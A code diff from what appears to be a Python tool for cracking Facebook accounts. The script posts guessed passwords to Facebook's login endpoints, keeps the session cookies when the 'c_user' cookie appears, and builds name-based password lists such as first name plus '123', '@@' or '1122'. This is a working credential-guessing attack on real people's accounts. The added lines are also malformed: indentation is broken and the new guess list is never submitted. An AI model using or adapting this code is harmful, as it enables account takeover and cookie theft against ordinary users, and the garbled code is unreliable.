@@ -185,7 +185,7 @@ class __xxx__:
                     "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                     "accept-encoding":"gzip, deflate br",
                     "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
+                } 
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -253,11 +253,42 @@ class __xxx__:
                         lastl = last.lower()
                         firsts = first.capitalize()
                         lasts = last.capitalize()
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                        else:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                        if len(nmf)<6:
+			        	if len(frs)<3:
+                            pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(nmf)
+					pwv.append('57273200')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(nmf)
+					pwv.append('57273200')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
                         ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
